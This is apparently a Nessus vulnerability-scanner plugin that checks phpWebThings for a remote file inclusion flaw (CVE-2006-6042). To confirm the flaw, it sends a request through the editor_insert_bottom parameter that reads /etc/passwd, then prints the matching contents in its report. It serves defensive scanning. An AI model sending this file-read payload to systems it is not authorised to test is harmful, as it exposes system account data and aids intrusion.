#
#       This script was written by Justin Seitz <jms@bughunter.ca>
#	Per Justin : GPLv2
#


include("compat.inc");

if(description)
{
 # set script identifiers

 script_id(23784);
 script_version("$Revision: 1.13 $");

 script_cve_id("CVE-2006-6042");
 script_bugtraq_id(21178);
  script_osvdb_id(30503);
  script_xref(name:"EDB-ID", value:"2811");

 script_name(english:"phpWebThings core/editor.php editor_insert_bottom Parameter Remote File Inclusion");
 script_summary(english:"Tries to read a local file with phpWebThings");
 script_family(english:"CGI abuses");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote web server is running phpWebThings, a PHP based photo
gallery management system. 

The version of phpWebThings installed on the remote host fails to
sanitize input to the 'editor_insert_bottom' parameter before using it
in the 'core/editor.php' script to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
exploit this issue to view arbitrary files and execute arbitrary code,
possibly taken from third-party hosts, on the remote host." );
 script_set_attribute(attribute:"solution", value:
"No patches or upgrades have been reported by the vendor at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/12/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/11/18");
 script_cvs_date("$Date: 2012/09/18 22:35:17 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpwebthings:phpwebthings");
script_end_attributes();

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2006-2012 Justin Seitz");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

#
# verify we can talk to the web server, if not exit
#

if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if(!can_host_php(port:port)) exit(0);

#
# create list of directories to scan
#


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpwebthings", "/webthings", "/phpwt", "/things", cgi_dirs()));
else dirs = make_list(cgi_dirs());
#
# Iterate through the list
#

file = "/etc/passwd";

foreach dir (dirs) {

#
#
#       Attack: Attempt a file include of /etc/passwd
#
#
  attackreq = http_get(item:string(dir, "/core/editor.php?editor_insert_bottom=", file),port:port);
  attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
  if (attackres == NULL) exit(0);
  if (egrep(pattern:"root:.*:0:[01]:", string:attackres) ||
    string("main(", file, "): failed to open stream: No such file") >< attackres ||
    "open_basedir restriction in effect. File(" >< attackres)   {

    passwd = "";
    if (egrep(pattern:"root:.*:0:[01]:", string:attackres))
      passwd = egrep(pattern:"^[a-z_0-9$-]+:.*:[0-9]*:[0-9]*:.*:", string:attackres);
	
    if (passwd) {
      if (dir == "") dir = "/";
      info = string("The version of phpWebThings installed in directory '", dir, "'\n",
        "is vulnerable to this issue. Here are the contents of /etc/passwd\n",
        "from the remote host :\n\n", passwd);
     security_warning(port: port, extra: info);
    }
    else
      security_warning(port:port);
    exit(0);
  }
}

